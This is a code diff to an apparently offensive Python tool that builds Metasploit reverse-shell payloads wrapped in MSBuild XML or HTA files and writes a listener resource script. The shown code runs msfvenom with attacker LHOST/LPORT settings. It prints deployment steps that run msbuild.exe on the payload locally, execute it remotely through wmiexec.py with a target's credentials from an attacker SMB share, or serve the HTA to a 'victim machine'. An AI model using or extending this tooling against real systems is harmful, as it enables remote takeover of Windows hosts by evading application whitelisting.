@@ -12,10 +12,20 @@ import netifaces as nic
 import pexpect
 import base64
 
+class bcolors:
+  BLUE = '\033[94m'
+  GREEN = '\033[92m'
+  WARNING = '\033[93m'
+  WHITE = '\033[97m'
+  ERROR = '\033[91m'
+  ENDC = '\033[0m'
+  BOLD = '\033[1m'
+  UNDERLINE = '\033[4m'
+
 listener_ip = "127.0.0.1"
 
 # Configure for auto detection of local IP Address
-local_interface = "eth0"
+local_interface = "ens33"
 
 try:
     raw_input          # Python 2
@@ -39,14 +49,14 @@ def generate_msfvenom_payload(msf_payload):
     listener_ip = raw_input("Enter Your Local IP Address (%s): " % local_ip) or local_ip
 
   # Get listern port from user
-  msf_port = raw_input("Enter the listener port: ")
+  msf_port = raw_input("Enter the listener port (443): ") or 443
 
   # Generate PSH payload
-  print("\nGenerating PSH Payload...")
+  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating PSH Payload...")
   output = pexpect.run("msfvenom -p %s LHOST=%s LPORT=%s --arch x86 --platform win -f psh -o msf_payload.ps1" % (msf_payload,listener_ip,msf_port))
 
   # Generate resource script
-  print("\nGenerating MSF Resource Script...")
+  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating MSF Resource Script...")
   msf_resource_file = open("msbuild_nps.rc", "a")
   payload_listener = "\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j -z" % (msf_payload, listener_ip, msf_port)
   msf_resource_file.write(payload_listener)
@@ -170,17 +180,13 @@ def generate_msbuild_nps_msf_payload():
   </UsingTask>
 </Project>""" % psh_payload)
 
-  print("\nMetasploit resource script written to msbuild_nps.rc")
-  print("\nRun \"msfconsole -r msbuild_nps.rc\" to start listener.")
-  print("\nPayload written to msbuild_nps.xml")
-  print("\nOptions to deploy:")
-  print("\n1) Copy the file to the target machine and then execute the following command:")
-  print("\n\t%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe <folder_path_here>\\msbuild_nps.xml")
-  print("\n\t--or--")
-  print("\n2) Use samba to share the file.")
-  print("\n\ta) Copy the msbuild_nps.xml file to a local samba share (ie: /var/samba/payload$)")
-  print("\tb) Execute the command remotely with the following command:")
-  print("\n\twmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %%windir%%\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\msbuild.exe \\\\\\\\%s\\\\payloads$\\\\msbuild_nps.xml" % listener_ip)
+  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Metasploit resource script written to msbuild_nps.rc")  
+  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Payload written to msbuild_nps.xml")
+  print("\n1. Run \"" + bcolors.WHITE + "msfconsole -r msbuild_nps.rc" + bcolors.ENDC + "\" to start listener.")
+  print("2. Choose a Deployment Option (a or b): - See README.md for more information.")
+  print("  a. Local File Deployment:\n" + bcolors.WHITE + "    - %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe <folder_path_here>\\msbuild_nps.xml" + bcolors.ENDC)
+  print("  b. Remote File Deployment:\n" + bcolors.WHITE + "    - wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \\\\<attackerip>\\<share>\\msbuild_nps.xml" + bcolors.ENDC)
+  print("3. Hack the Planet!!")
 
   sys.exit(0)
 
@@ -361,10 +367,11 @@ def generate_msbuild_nps_msf_hta_payload():
   End Function
 </script>""" % psh_payloads)
 
-  print("\nMetasploit resource script written to msbuild_nps.rc")
-  print("\nRun \"msfconsole -r msbuild_nps.rc\" to start listener.")
-  print("\nPayload written to msbuild_nps.hta.")
-  print("\n(Hint: Remove comments before deploying)")
+  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Metasploit resource script written to msbuild_nps.rc")  
+  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Payload written to msbuild_nps.hta")
+  print("\n1. Run \"" + bcolors.WHITE + "msfconsole -r msbuild_nps.rc" + bcolors.ENDC + "\" to start listener.")
+  print("2. Deploy hta file to web server and navigate from the victim machine.")
+  print("3. Hack the Planet!!")
 
   sys.exit()
 
